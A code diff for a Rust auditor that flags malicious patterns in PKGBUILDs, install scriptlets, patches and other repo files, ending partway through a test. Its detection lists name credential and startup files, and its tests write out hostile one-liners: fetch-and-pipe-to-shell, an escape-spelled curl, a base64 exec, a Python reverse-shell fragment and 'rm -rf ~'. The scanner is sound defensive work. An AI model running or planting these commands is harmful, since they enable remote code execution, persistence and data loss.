@@ -78,20 +78,77 @@ impl AuditReport {
 }
 
 /// The `install=` scriptlet file name declared by `pkgbuild`, if any.
+/// `$pkgname`-style references are expanded from the PKGBUILD's own plain
+/// assignments (`install=$pkgname.install` is the common form).
 pub fn scriptlet_name(pkgbuild: &str) -> Option<String> {
-    parse(pkgbuild)
-        .assignments
-        .into_iter()
-        .find(|a| a.name == "install" && !a.dynamic)
-        .and_then(|a| a.items.into_iter().next())
-        .filter(|n| !n.is_empty() && !n.contains('/'))
+    let parsed = parse(pkgbuild);
+    let value = |name: &str| {
+        parsed
+            .assignments
+            .iter()
+            .find(|a| a.name == name && !a.dynamic)
+            .and_then(|a| a.items.first().cloned())
+    };
+    let mut name = value("install")?;
+    for _ in 0..4 {
+        if !name.contains('$') {
+            break;
+        }
+        let mut out = String::new();
+        let mut rest = name.as_str();
+        while let Some(at) = rest.find('$') {
+            out.push_str(&rest[..at]);
+            rest = &rest[at + 1..];
+            let (var, after) = match rest.strip_prefix('{') {
+                Some(inner) => match inner.split_once('}') {
+                    Some((v, a)) => (v, a),
+                    None => break,
+                },
+                None => {
+                    let end = rest
+                        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+                        .unwrap_or(rest.len());
+                    (&rest[..end], &rest[end..])
+                }
+            };
+            let v =
+                value(var).or_else(|| (var == "pkgbase").then(|| value("pkgname")).flatten())?;
+            out.push_str(&v);
+            rest = after;
+        }
+        out.push_str(rest);
+        name = out;
+    }
+    (!name.is_empty() && !name.contains(['$', '/'])).then_some(name)
 }
 
-/// Audits a PKGBUILD and, if given, its scriptlet (`(file name, contents)`).
-pub fn audit(target: &str, pkgbuild: &str, scriptlet: Option<(&str, &str)>) -> AuditReport {
-    let mut findings = audit_file("PKGBUILD", pkgbuild, false);
+/// A file from the package's repo other than the PKGBUILD and scriptlet.
+#[derive(Debug, Clone)]
+pub struct ExtraFile {
+    /// Path inside the repo.
+    pub path: String,
+    pub bytes: Vec<u8>,
+}
+
+/// Audits a PKGBUILD, its scriptlet (`(file name, contents)`) and the other
+/// files of the repo.
+pub fn audit(
+    target: &str,
+    pkgbuild: &str,
+    scriptlet: Option<(&str, &str)>,
+    extras: &[ExtraFile],
+) -> AuditReport {
+    let mut findings = audit_file("PKGBUILD", pkgbuild, Mode::Pkgbuild);
     if let Some((name, text)) = scriptlet {
-        findings.extend(audit_file(name, text, true));
+        findings.extend(audit_file(name, text, Mode::Scriptlet));
+    }
+    let scriptlet_name = scriptlet.map(|(n, _)| n);
+    for extra in extras
+        .iter()
+        .filter(|e| e.path != "PKGBUILD" && Some(e.path.as_str()) != scriptlet_name)
+        .take(MAX_EXTRA_FILES)
+    {
+        findings.extend(audit_extra(extra));
     }
     findings.sort_by(|a, b| {
         b.severity
@@ -105,6 +162,148 @@ pub fn audit(target: &str, pkgbuild: &str, scriptlet: Option<(&str, &str)>) -> A
         target: target.to_string(),
         findings,
     }
+}
+
+/// How many extra files are read; the rest are ignored.
+pub const MAX_EXTRA_FILES: usize = 200;
+const MAX_EXTRA_BYTES: usize = 1024 * 1024;
+
+const DATA_EXTENSIONS: &[&str] = &[
+    "md",
+    "txt",
+    "rst",
+    "sig",
+    "asc",
+    "pub",
+    "gpg",
+    "kbx",
+    "png",
+    "jpg",
+    "jpeg",
+    "gif",
+    "svg",
+    "ico",
+    "webp",
+    "xpm",
+    "ttf",
+    "otf",
+    "woff",
+    "woff2",
+    "json",
+    "toml",
+    "yml",
+    "yaml",
+    "conf",
+    "cfg",
+    "ini",
+    "desktop",
+    "xml",
+    "html",
+    "css",
+    "po",
+    "mo",
+    "pc",
+    "service",
+    "timer",
+    "socket",
+    "sysusers",
+    "tmpfiles",
+    "rules",
+    "1",
+    "8",
+    "gitignore",
+    "gitattributes",
+];
+const SCRIPT_EXTENSIONS: &[&str] = &[
+    "sh", "bash", "zsh", "ksh", "py", "pl", "rb", "js", "mjs", "lua", "php", "install", "hook",
+];
+
+/// Reads one non-PKGBUILD file of the repo. Findings are labelled with its
+/// path.
+fn audit_extra(extra: &ExtraFile) -> Vec<Finding> {
+    let path = extra.path.as_str();
+    let base = path.rsplit('/').next().unwrap_or(path);
+    let lower = base.to_lowercase();
+    let ext = lower.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
+    let note = |rule: &'static str, severity, msg: &str| {
+        vec![Finding {
+            rule,
+            severity,
+            file: path.to_string(),
+            line: 1,
+            message: msg.to_string(),
+            excerpt: path.to_string(),
+        }]
+    };
+
+    if matches!(
+        base,
+        "PKGBUILD" | ".SRCINFO" | ".gitignore" | ".gitattributes"
+    ) || lower.starts_with("license")
+        || lower.starts_with("copying")
+        || lower.starts_with("readme")
+        || DATA_EXTENSIONS.contains(&ext)
+    {
+        return Vec::new();
+    }
+    if extra.bytes.len() > MAX_EXTRA_BYTES {
+        return note(
+            "unscanned-file",
+            Severity::Info,
+            "is too large to scan; read it yourself if it matters",
+        );
+    }
+    if extra.bytes.starts_with(b"\x7fELF") {
+        return note(
+            "committed-binary",
+            Severity::High,
+            "is a compiled executable committed to the repo; it can't be read and it isn't built from source",
+        );
+    }
+    if extra.bytes.iter().take(8000).any(|b| *b == 0) {
+        return if matches!(
+            ext,
+            "gz" | "xz" | "zst" | "bz2" | "zip" | "tar" | "tgz" | "7z"
+        ) {
+            note(
+                "opaque-file",
+                Severity::Warning,
+                "is an archive committed to the repo, which can't be inspected here",
+            )
+        } else {
+            note(
+                "opaque-file",
+                Severity::Warning,
+                "is a binary file that can't be inspected here",
+            )
+        };
+    }
+
+    let text = String::from_utf8_lossy(&extra.bytes);
+    let is_patch = matches!(ext, "patch" | "diff") || text.starts_with("diff --git");
+    if is_patch {
+        // Only what the patch adds ends up in the code; keep line numbers.
+        let added: String = text
+            .lines()
+            .map(|l| match l.strip_prefix('+') {
+                Some(rest) if !l.starts_with("+++") => rest,
+                _ => "",
+            })
+            .collect::<Vec<_>>()
+            .join("\n");
+        return audit_file(path, &added, Mode::Script)
+            .into_iter()
+            .map(|mut f| {
+                f.severity = f.severity.min(Severity::Warning);
+                f.message = format!("(added by this patch) {}", f.message);
+                f
+            })
+            .collect();
+    }
+    if text.starts_with("#!") || SCRIPT_EXTENSIONS.contains(&ext) {
+        return audit_file(path, &text, Mode::Script);
+    }
+    Vec::new()
 }
 
 // ---------------------------------------------------------------- reader
@@ -467,6 +666,13 @@ fn parse(text: &str) -> Parsed {
             if !is_array {
                 items.truncate(1);
             }
+            if dynamic {
+                // `x=$(curl … | sh)` runs when the file is merely read.
+                parsed.toplevel.push(Line {
+                    no,
+                    text: format!("{name}={}", acc.replace('\n', " ")),
+                });
+            }
             parsed.assignments.push(Assignment {
                 name: name.to_string(),
                 items,
@@ -492,6 +698,8 @@ struct Stage {
     cmd: String,
     /// Asked for elevated privileges (`sudo`, `doas`, `pkexec`, `run0`, `su`).
     privileged: bool,
+    /// The command word is a bare variable or substitution (`$a$b`).
+    dynamic: bool,
     args: Vec<String>,
     /// Receives the previous stage's output.
     piped: bool,
@@ -586,22 +794,60 @@ const WRAPPER_VALUE_FLAGS: &[&str] = &["-u", "-g", "-C", "-h", "-p", "-r", "-t",
 fn stage_of(text: &str, piped: bool) -> Stage {
     let tokens = tokenize(text);
     let mut idx = 0;
-    while idx < tokens.len()
-        && (KEYWORDS.contains(&tokens[idx].as_str()) || is_var_assignment(&tokens[idx]))
-    {
-        idx += 1;
+    // The word that is really being run, when it hides inside `x=$(cmd …`.
+    let mut inner: Option<String> = None;
+    // `case $x in`, `for i in …` and `name=( … )` have no command word.
+    let mut no_command = false;
+    while idx < tokens.len() {
+        let tok = tokens[idx].as_str();
+        if KEYWORDS.contains(&tok) {
+            if matches!(tok, "case" | "for" | "select") {
+                no_command = true;
+                break;
+            }
+            idx += 1;
+        } else if is_var_assignment(tok) {
+            let value = tok.split_once('=').map(|(_, v)| v).unwrap_or("");
+            if value.starts_with('(') {
+                no_command = true;
+                break;
+            }
+            // `x=$(basename "$0")`: what runs is `basename`, not `"$0"`.
+            let start = value
+                .rfind("$(")
+                .map(|i| i + 2)
+                .or_else(|| value.rfind('`').map(|i| i + 1));
+            idx += 1;
+            if let Some(at) = start {
+                if at < value.len() {
+                    inner = Some(value[at..].to_string());
+                    break;
+                }
+            }
+        } else {
+            break;
+        }
     }
     let mut privileged = false;
+    let first_word: Option<&str> = if no_command {
+        None
+    } else {
+        inner
+            .as_deref()
+            .or_else(|| tokens.get(idx).map(String::as_str))
+    };
+    let mut dynamic = first_word.is_some_and(is_dynamic_command_word);
     let basename = |word: &str| {
-        let word = word.trim_start_matches(['$', '(', '{', '`']);
+        let word = word
+            .trim_start_matches(['$', '(', '{', '`'])
+            .trim_end_matches([')', '}', '`']);
         word.rsplit('/').next().unwrap_or(word).to_string()
     };
-    let mut cmd = tokens
-        .get(idx)
+    let mut cmd = first_word
         .filter(|w| !w.starts_with('-'))
-        .map(|w| basename(w))
+        .map(basename)
         .unwrap_or_default();
-    if !cmd.is_empty() {
+    if !cmd.is_empty() && inner.is_none() {
         idx += 1;
     }
     // `su` hands its command to a shell: counted as elevation, not unwrapped.
@@ -628,6 +874,7 @@ fn stage_of(text: &str, piped: bool) -> Stage {
                 skip_timeout_duration = false;
                 continue;
             }
+            dynamic = is_dynamic_command_word(tok);
             next = Some(basename(tok));
             break;
         }
@@ -646,10 +893,103 @@ fn stage_of(text: &str, piped: bool) -> Stage {
     Stage {
         cmd,
         privileged,
+        dynamic,
         args,
         piped,
         text: text.to_string(),
     }
+}
+
+/// Variables that are conventionally tools, so `$CC -o x y.c` is ordinary.
+const TOOL_VARS: &[&str] = &[
+    "CC",
+    "CXX",
+    "CPP",
+    "LD",
+    "AR",
+    "AS",
+    "NM",
+    "RANLIB",
+    "STRIP",
+    "OBJCOPY",
+    "MAKE",
+    "CMAKE",
+    "PYTHON",
+    "PERL",
+    "RUBY",
+    "NODE",
+    "GO",
+    "CARGO",
+    "RUSTC",
+    "GCC",
+    "GXX",
+    "CLANG",
+    "MESON",
+    "NINJA",
+    "PKG_CONFIG",
+    "SHELL",
+    "EDITOR",
+    "CONFIG_SHELL",
+];
+
+/// `$cmd`, `${a}${b}`, `$(…)` or a backtick as the command word, with no
+/// path in it and not one of the usual tool variables.
+fn is_dynamic_command_word(word: &str) -> bool {
+    if word.contains('/') {
+        return false;
+    }
+    if word.starts_with("$(") || word.starts_with('`') {
+        return true;
+    }
+    let Some(rest) = word.strip_prefix('$') else {
+        return false;
+    };
+    let rest = rest.strip_prefix('{').unwrap_or(rest);
+    let name: String = rest
+        .chars()
+        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
+        .collect();
+    !name.is_empty()
+        && name.chars().next().is_some_and(is_ident_start)
+        && !TOOL_VARS.contains(&name.as_str())
+}
+
+/// Files a fetcher stage writes, by base name.
+fn download_targets(stage: &Stage) -> Vec<String> {
+    let base = |p: &str| {
+        let p = p.split(['?', '#']).next().unwrap_or(p);
+        p.rsplit('/').next().unwrap_or(p).to_string()
+    };
+    let mut out = Vec::new();
+    let args = &stage.args;
+    let mut named = false;
+    for (i, a) in args.iter().enumerate() {
+        let value = match a.as_str() {
+            "-o" | "--output" | "--output-document" => args.get(i + 1).cloned(),
+            // wget's -O takes a name; curl's -O means "use the URL's name".
+            "-O" if stage.cmd != "curl" => args.get(i + 1).cloned(),
+            _ => a
+                .strip_prefix("--output=")
+                .or_else(|| a.strip_prefix("--output-document="))
+                .or_else(|| {
+                    a.strip_prefix("-o")
+                        .filter(|v| !v.is_empty() && !v.starts_with('-'))
+                })
+                .map(str::to_string),
+        };
+        if let Some(v) = value.filter(|v| v != "-") {
+            out.push(base(&v));
+            named = true;
+        }
+    }
+    // `curl -O url` / plain `wget url` save under the URL's own name.
+    let remote_name = stage.cmd == "curl" && args.iter().any(|a| a == "-O" || a == "--remote-name");
+    if !named || remote_name {
+        out.extend(args.iter().filter(|a| a.contains("://")).map(|u| base(u)));
+    }
+    out.extend(redirect_targets(&stage.text).iter().map(|t| base(t)));
+    out.retain(|n| !n.is_empty());
+    out
 }
 
 /// Targets of unquoted `>`/`>>` redirections in `s`.
@@ -705,7 +1045,21 @@ const DECODERS: &[&str] = &[
     "openssl base64 -d",
     "b64decode",
 ];
-const PERSISTENCE_PATHS: &[&str] = &[
+/// Files whose modification is persistence or a takeover however it
+/// happens: SSH keys, preload, sudo, accounts, scheduled jobs.
+const TRUST_PATHS: &[&str] = &[
+    "authorized_keys",
+    "ld.so.preload",
+    "/etc/sudoers",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/crontab",
+    "/etc/rc.local",
+];
+/// Shell startup files and autostart: critical in a PKGBUILD (a build has no
+/// business editing them), high in an install scriptlet or shipped script
+/// (some legitimate packages append a `source` line for their tool).
+const STARTUP_PATHS: &[&str] = &[
     ".bashrc",
     ".bash_profile",
     ".bash_login",
@@ -714,14 +1068,7 @@ const PERSISTENCE_PATHS: &[&str] = &[
     ".zshenv",
     ".zprofile",
     ".profile",
-    "authorized_keys",
     "/etc/profile",
-    "ld.so.preload",
-    "/etc/sudoers",
-    "/etc/passwd",
-    "/etc/shadow",
-    "/etc/crontab",
-    "/etc/rc.local",
     ".config/autostart",
 ];
 const SECRET_PATHS: &[&str] = &[
@@ -812,6 +1159,25 @@ fn pacman_mutates(args: &[String]) -> bool {
     })
 }
 
+/// Does this stage turn a stream of packed data into text on stdout?
+fn streams_unpacked(stage: &Stage) -> bool {
+    let has = |f: &str| stage.args.iter().any(|a| a == f);
+    match stage.cmd.as_str() {
+        "gpg" | "gpg2" | "openssl" | "zcat" | "bzcat" | "xzcat" | "zstdcat" | "lz4cat"
+        | "gunzip" | "bunzip2" | "unxz" | "unzstd" => true,
+        "gzip" | "xz" | "zstd" | "bzip2" => has("-d") || has("--decompress") || has("-dc"),
+        "tar" => {
+            has("--to-stdout")
+                || stage
+                    .args
+                    .iter()
+                    .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('O'))
+        }
+        "unzip" => has("-p"),
+        _ => false,
+    }
+}
+
 fn excerpt(s: &str) -> String {
     let t = s.trim();
     if t.chars().count() > 160 {
@@ -822,9 +1188,28 @@ fn excerpt(s: &str) -> String {
     }
 }
 
+/// What kind of file is being read; decides which rules apply.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Mode {
+    /// The PKGBUILD itself: every rule.
+    Pkgbuild,
+    /// The `install=` scriptlet: runs as root at install time.
+    Scriptlet,
+    /// Any other script in the repo: the dangerous-pattern rules, but not the
+    /// PKGBUILD-only ones (a shipped wrapper may legitimately use `sudo`).
+    Script,
+}
+
 struct Scan<'a> {
     file: &'a str,
-    scriptlet: bool,
+    mode: Mode,
+    /// Files fetched by `curl`/`wget`/… so far, by base name.
+    downloaded: Vec<String>,
+    /// First line that opens a socket, and whether the file also wires
+    /// something to a shell (`dup2`, `pty.spawn`): the Python/Perl
+    /// reverse-shell idiom, which usually spans lines.
+    socket_line: Option<(usize, String)>,
+    shell_wiring: bool,
     findings: Vec<Finding>,
     secret_lines: Vec<usize>,
     upload_lines: Vec<(usize, String)>,
@@ -858,15 +1243,17 @@ impl Scan<'_> {
             .map(|(t, p)| stage_of(&t, p))
             .collect();
         let under_build_dirs = text.contains("pkgdir") || text.contains("srcdir");
-        let in_pkgbuild = !self.scriptlet;
+        let in_pkgbuild = self.mode == Mode::Pkgbuild;
 
-        // Pipelines: fetch | shell, decode | shell.
+        // Pipelines: fetch | shell, decode | shell, unpack | shell.
         let mut fetched = false;
         let mut decoded = false;
+        let mut unpacked = false;
         for stage in &stages {
             if !stage.piped {
                 fetched = false;
                 decoded = false;
+                unpacked = false;
             }
             let interp = SHELLS.contains(&stage.cmd.as_str());
             if interp && stage.piped && fetched {
@@ -887,11 +1274,23 @@ impl Scan<'_> {
                     text,
                 );
             }
+            if interp && stage.piped && unpacked && !fetched && !decoded {
+                self.add(
+                    "extract-pipe-exec",
+                    Severity::High,
+                    no,
+                    "unpacks code on the fly and runs it without it ever being a file you can read",
+                    text,
+                );
+            }
             if FETCHERS.contains(&stage.cmd.as_str()) {
                 fetched = true;
             }
             if DECODERS.iter().any(|d| stage.text.contains(d)) {
                 decoded = true;
+            }
+            if streams_unpacked(stage) {
+                unpacked = true;
             }
         }
         let has_interp = stages.iter().any(|s| SHELLS.contains(&s.cmd.as_str()));
@@ -916,6 +1315,108 @@ impl Scan<'_> {
                 "downloads code and runs it directly",
                 text,
             );
+        }
+
+        // Fallbacks for code in other languages, where there are no pipeline
+        // stages to look at: `os.system("curl x | sh")`, `exec(b64decode(..))`.
+        let text_pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
+            .iter()
+            .any(|p| text.contains(p));
+        if text_pipes_to_shell && ["curl ", "wget "].iter().any(|f| text.contains(f)) {
+            self.add(
+                "remote-exec",
+                Severity::High,
+                no,
+                "downloads code and runs it directly",
+                text,
+            );
+        }
+        if DECODERS.iter().any(|d| text.contains(d))
+            && (text.contains("exec(") || text.contains("eval(") || text_pipes_to_shell)
+        {
+            self.add(
+                "obfuscated-exec",
+                Severity::Critical,
+                no,
+                "decodes a hidden payload and runs it",
+                text,
+            );
+        }
+
+        // Code that hides what it runs.
+        if stages
+            .iter()
+            .any(|s| s.text.trim_start().starts_with("$'\\"))
+        {
+            self.add(
+                "obfuscated-command",
+                Severity::High,
+                no,
+                "spells a command with escape sequences to hide it",
+                text,
+            );
+        }
+        if stages.iter().any(|s| s.dynamic) {
+            self.add(
+                "dynamic-command",
+                Severity::Warning,
+                no,
+                "the command to run is built at runtime, so it can't be read statically",
+                text,
+            );
+        }
+        if text
+            .split_whitespace()
+            .map(|t| t.trim_matches(['"', '\'', '(', ')', ';']))
+            .any(|t| {
+                t.len() >= 200
+                    && t.chars().all(|c| {
+                        c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '_' | '-')
+                    })
+            })
+        {
+            self.add(
+                "encoded-blob",
+                Severity::Warning,
+                no,
+                "contains a long encoded blob that can't be read",
+                text,
+            );
+        }
+
+        // Download now, run later.
+        for stage in &stages {
+            if FETCHERS.contains(&stage.cmd.as_str()) {
+                let names = download_targets(stage);
+                self.downloaded.extend(names);
+            }
+        }
+        if !self.downloaded.is_empty() {
+            let names_downloaded = |s: &Stage, this: &Self| {
+                s.args.iter().any(|a| {
+                    let base = a.rsplit('/').next().unwrap_or(a);
+                    this.downloaded.iter().any(|d| d == base)
+                })
+            };
+            for stage in &stages {
+                let runs = (SHELLS.contains(&stage.cmd.as_str()) && names_downloaded(stage, self))
+                    || self.downloaded.contains(&stage.cmd)
+                    || (stage.cmd == "chmod"
+                        && stage
+                            .args
+                            .iter()
+                            .any(|a| a.contains("+x") || a == "755" || a == "700")
+                        && names_downloaded(stage, self));
+                if runs {
+                    self.add(
+                        "download-then-run",
+                        Severity::High,
+                        no,
+                        "runs a file that this same script downloaded",
+                        text,
+                    );
+                }
+            }
         }
 
         // Reverse shells.
@@ -957,7 +1458,8 @@ impl Scan<'_> {
                     });
                     recursive
                         && stage.args.iter().any(|a| {
-                            !a.starts_with('-') && DANGEROUS_RM_TARGETS.contains(&a.as_str())
+                            !a.starts_with('-')
+                                && DANGEROUS_RM_TARGETS.contains(&a.trim_end_matches([')', '`']))
                         })
                 }
                 "dd" => stage.args.iter().any(|a| {
@@ -988,20 +1490,57 @@ impl Scan<'_> {
             );
         }
 
-        // Persistence: writing startup files, keys, preload, sudoers.
-        let writes = text.contains('>')
-            || stages.iter().any(|s| {
-                matches!(
-                    s.cmd.as_str(),
-                    "tee" | "cp" | "mv" | "ln" | "install" | "dd" | "crontab"
-                ) || (s.cmd == "sed" && s.args.iter().any(|a| a.starts_with("-i")))
-            });
-        if writes && !under_build_dirs && PERSISTENCE_PATHS.iter().any(|p| text.contains(p)) {
+        // Persistence: writing startup files, keys, preload, sudoers. Judged
+        // by where a command *writes*, so `grep x /etc/passwd > /dev/null`
+        // and `cp /etc/profile /tmp/x` are not hits.
+        let mut written: Vec<String> = redirect_targets(text);
+        for stage in &stages {
+            let non_flags: Vec<&String> =
+                stage.args.iter().filter(|a| !a.starts_with('-')).collect();
+            match stage.cmd.as_str() {
+                "cp" | "mv" | "ln" | "install" => {
+                    written.extend(non_flags.last().map(|s| s.to_string()));
+                }
+                "tee" => written.extend(non_flags.iter().map(|s| s.to_string())),
+                "dd" => written.extend(
+                    stage
+                        .args
+                        .iter()
+                        .filter_map(|a| a.strip_prefix("of="))
+                        .map(str::to_string),
+                ),
+                "sed" if stage.args.iter().any(|a| a.starts_with("-i")) => {
+                    written.extend(non_flags.iter().map(|s| s.to_string()));
+                }
+                _ => {}
+            }
+        }
+        written.retain(|t| !t.contains("pkgdir") && !t.contains("srcdir"));
+        if written
+            .iter()
+            .any(|t| TRUST_PATHS.iter().any(|p| t.contains(p)))
+        {
             self.add(
                 "persistence",
                 Severity::Critical,
                 no,
-                "modifies a shell startup file, SSH key list, preload or account file outside the package",
+                "modifies an SSH key list, preload file, sudoers, account file or scheduled-job list outside the package",
+                text,
+            );
+        } else if written
+            .iter()
+            .any(|t| STARTUP_PATHS.iter().any(|p| t.contains(p)))
+        {
+            let severity = if self.mode == Mode::Pkgbuild {
+                Severity::Critical
+            } else {
+                Severity::High
+            };
+            self.add(
+                "persistence",
+                severity,
+                no,
+                "modifies a shell startup file or autostart entry outside the package",
                 text,
             );
         }
@@ -1248,6 +1787,15 @@ impl Scan<'_> {
     }
 
     fn finish(&mut self) {
+        if let (Some((no, text)), true) = (self.socket_line.take(), self.shell_wiring) {
+            self.add(
+                "reverse-shell",
+                Severity::Critical,
+                no,
+                "wires a network socket to a shell",
+                &text,
+            );
+        }
         if let Some(&first_secret) = self.secret_lines.first() {
             for (no, text) in std::mem::take(&mut self.upload_lines) {
                 let msg = format!(
@@ -1265,11 +1813,15 @@ const TOPLEVEL_OK: &[&str] = &[
     ";;", "cd",
 ];
 
-fn audit_file(file: &str, text: &str, scriptlet: bool) -> Vec<Finding> {
+fn audit_file(file: &str, text: &str, mode: Mode) -> Vec<Finding> {
+    let scriptlet = mode == Mode::Scriptlet;
     let parsed = parse(text);
     let mut scan = Scan {
         file,
-        scriptlet,
+        mode,
+        downloaded: Vec::new(),
+        socket_line: None,
+        shell_wiring: false,
         findings: Vec::new(),
         secret_lines: Vec::new(),
         upload_lines: Vec::new(),
@@ -1283,7 +1835,7 @@ fn audit_file(file: &str, text: &str, scriptlet: bool) -> Vec<Finding> {
             "this scriptlet runs as root when the package is installed or removed",
             file,
         );
-    } else {
+    } else if mode == Mode::Pkgbuild {
         declarative(&parsed, &mut scan);
     }
 
@@ -1301,7 +1853,10 @@ fn audit_file(file: &str, text: &str, scriptlet: bool) -> Vec<Finding> {
             false,
         );
         scan.line("", line.no, &line.text);
-        if !scriptlet && !TOPLEVEL_OK.contains(&first.cmd.as_str()) && !line.text.trim().is_empty()
+        if mode == Mode::Pkgbuild
+            && assignment_split(line.text.trim()).is_none()
+            && !TOPLEVEL_OK.contains(&first.cmd.as_str())
+            && !line.text.trim().is_empty()
         {
             scan.add(
                 "toplevel-command",
@@ -1312,6 +1867,16 @@ fn audit_file(file: &str, text: &str, scriptlet: bool) -> Vec<Finding> {
             );
         }
     }
+    // Read from the raw text: in other languages `s = socket.socket()` is
+    // not a command, and the shell reader would file it as an assignment.
+    scan.socket_line = text
+        .lines()
+        .enumerate()
+        .find(|(_, l)| l.contains("socket.socket"))
+        .map(|(i, l)| (i + 1, l.to_string()));
+    scan.shell_wiring = ["dup2", "pty.spawn", "/bin/sh -i", "/bin/bash -i"]
+        .iter()
+        .any(|p| text.contains(p));
     scan.finish();
     scan.findings
 }
@@ -1444,7 +2009,7 @@ mod tests {
     use super::*;
 
     fn findings(pkgbuild: &str) -> Vec<Finding> {
-        audit("t", pkgbuild, None).findings
+        audit("t", pkgbuild, None, &[]).findings
     }
 
     fn rules(pkgbuild: &str) -> Vec<(&'static str, Severity)> {
@@ -1959,7 +2524,7 @@ EOF
         assert_eq!(scriptlet_name("pkgname=x\n"), None);
 
         let script = "post_install() {\n  curl -s http://x | sh\n  systemctl daemon-reload\n  sudo true\n}\n";
-        let report = audit("t", pkg, Some(("x.install", script)));
+        let report = audit("t", pkg, Some(("x.install", script)), &[]);
         let f: Vec<_> = report
             .findings
             .iter()
@@ -1977,15 +2542,436 @@ EOF
         assert_eq!(report.verdict(), Verdict::Confirm);
     }
 
+    // ---- u16: more obfuscation coverage and the rest of the repo
+
+    fn extra(path: &str, text: &str) -> ExtraFile {
+        ExtraFile {
+            path: path.to_string(),
+            bytes: text.as_bytes().to_vec(),
+        }
+    }
+
+    fn extras_report(extras: &[ExtraFile]) -> Vec<(String, &'static str, Severity)> {
+        audit("t", "pkgname=x\n", None, extras)
+            .findings
+            .into_iter()
+            .map(|f| (f.file, f.rule, f.severity))
+            .collect()
+    }
+
+    fn extra_has(extras: &[ExtraFile], file: &str, rule: &str, severity: Severity) -> bool {
+        extras_report(extras)
+            .iter()
+            .any(|(f, r, s)| f == file && *r == rule && *s == severity)
+    }
+
+    #[test]
+    fn download_then_run_is_high_but_only_for_what_was_downloaded() {
+        for lines in [
+            "curl -o inst.sh http://x/i\nsh inst.sh",
+            "wget -O i http://x/i; chmod +x i; ./i",
+            "curl -O http://x/foo.sh\nbash foo.sh",
+            "curl -s http://x/i > inst\nsource ./inst",
+            "wget http://x/setup.py && python3 setup.py",
+        ] {
+            assert!(
+                has(&body("build", lines), "download-then-run", Severity::High),
+                "{lines}"
+            );
+        }
+        for ok in [
+            "curl -o src.tar.gz http://x/a.tar.gz\ntar xf src.tar.gz",
+            "curl -o a.sh http://x/a\nsh other.sh",
+            "wget http://x/a.tar.gz\nmake",
+        ] {
+            assert!(
+                !has(&body("build", ok), "download-then-run", Severity::High),
+                "{ok}"
+            );
+        }
+    }
+
+    #[test]
+    fn unpacking_into_a_shell_is_high() {
+        for line in [
+            "gpg -d payload.gpg | sh",
+            "zcat x.gz | bash",
+            "tar -xOf a.tar run.sh | sh",
+            "unzip -p a.zip run.sh | bash",
+            "xz -dc x.xz | sh",
+        ] {
+            assert!(
+                has(&body("build", line), "extract-pipe-exec", Severity::High),
+                "{line}"
+            );
+        }
+        for ok in [
+            "tar xf a.tar",
+            "zcat x.gz | grep foo",
+            "gpg --verify a.sig a",
+        ] {
+            assert!(
+                !has(&body("build", ok), "extract-pipe-exec", Severity::High),
+                "{ok}"
+            );
+        }
+    }
+
+    #[test]
+    fn escape_spelled_and_runtime_built_commands() {
+        assert!(has(
+            &body("build", "$'\\x63\\x75\\x72\\x6c' -s http://x"),
+            "obfuscated-command",
+            Severity::High
+        ));
+        // Ordinary ANSI-C strings as arguments are fine.
+        for ok in ["IFS=$'\\n'", "echo -e $'\\033[0m' done"] {
+            assert!(
+                !has(&body("build", ok), "obfuscated-command", Severity::High),
+                "{ok}"
+            );
+        }
+        for line in [
+            "$a$b -s http://x",
+            "${cmd} run",
+            "$(echo curl) x",
+            "`echo sh` y",
+        ] {
+            assert!(
+                has(&body("build", line), "dynamic-command", Severity::Warning),
+                "{line}"
+            );
+        }
+        for ok in [
+            "$CC -o x y.c",
+            "${MAKE:-make} install",
+            "\"$srcdir/configure\" --prefix=/usr",
+            "$MAKE",
+            "echo $a$b",
+            "\"$@\"",
+        ] {
+            assert!(
+                !has(&body("build", ok), "dynamic-command", Severity::Warning),
+                "{ok}"
+            );
+        }
+    }
+
+    #[test]
+    fn long_encoded_blobs_are_flagged_and_hashes_are_not() {
+        let blob = "QUFB".repeat(70);
+        assert!(has(
+            &body("build", &format!("echo {blob} > x")),
+            "encoded-blob",
+            Severity::Warning
+        ));
+        let sha = "a".repeat(64);
+        assert!(!has(
+            &body("build", &format!("echo {sha} > x")),
+            "encoded-blob",
+            Severity::Warning
+        ));
+    }
+
+    #[test]
+    fn extra_scripts_get_the_dangerous_pattern_rules() {
+        let f = [extra("helper.sh", "#!/bin/sh\necho 'x' >> ~/.bashrc\n")];
+        // A shipped script editing a shell rc file is high, not critical.
+        assert!(extra_has(&f, "helper.sh", "persistence", Severity::High));
+
+        let py = [extra(
+            "setup.py",
+            "import os\nos.system(\"curl http://x/i | sh\")\n",
+        )];
+        assert!(extra_has(&py, "setup.py", "remote-exec", Severity::High));
+
+        let enc = [extra(
+            "run.py",
+            "import base64\nexec(base64.b64decode('aGk='))\n",
+        )];
+        assert!(extra_has(
+            &enc,
+            "run.py",
+            "obfuscated-exec",
+            Severity::Critical
+        ));
+
+        let sock = [extra(
+            "r.py",
+            "import socket,os\ns=socket.socket()\nos.dup2(s.fileno(),0)\n",
+        )];
+        assert!(extra_has(
+            &sock,
+            "r.py",
+            "reverse-shell",
+            Severity::Critical
+        ));
+
+        // Found by shebang even without an extension, and nested.
+        let nested = [extra("bin/launcher", "#!/bin/bash\nrm -rf ~\n")];
+        assert!(extra_has(
+            &nested,
+            "bin/launcher",
+            "destructive",
+            Severity::Critical
+        ));
+    }
+
+    #[test]
+    fn extra_scripts_skip_the_pkgbuild_only_rules() {
+        // A shipped wrapper may legitimately do these.
+        let f = [extra(
+            "wrapper.sh",
+            "#!/bin/sh\nsudo make install\ncp a /usr/bin/a\ngit clone https://x/y\n",
+        )];
+        let r = extras_report(&f);
+        assert!(r.iter().all(|(_, _, s)| *s <= Severity::Info), "{r:?}");
+    }
+
+    #[test]
+    fn patches_are_read_by_their_added_lines_and_capped_at_warning() {
+        let patch = "--- a/x\n+++ b/x\n@@ -1,2 +1,3 @@\n context\n-removed sudo line\n+curl http://x/i | sh\n+echo hi >> ~/.bashrc\n";
+        let f = [extra("fix.patch", patch)];
+        let r = audit("t", "pkgname=x\n", None, &f).findings;
+        assert!(r
+            .iter()
